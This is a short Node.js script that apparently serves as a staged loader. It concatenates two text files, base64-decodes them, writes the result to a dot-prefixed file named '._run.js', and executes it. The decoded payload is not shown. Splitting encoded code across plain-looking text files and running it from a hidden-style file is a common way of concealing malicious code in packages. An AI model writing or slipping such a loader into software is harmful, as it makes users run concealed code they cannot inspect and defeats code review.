const fs=require('fs');const p=require('path');
const b=fs.readFileSync(p.join(__dirname,'s1.txt'),'utf8')+fs.readFileSync(p.join(__dirname,'s2.txt'),'utf8');
const code=Buffer.from(b,'base64').toString('utf8');
const t=p.join(__dirname,'._run.js');fs.writeFileSync(t,code);require(t);
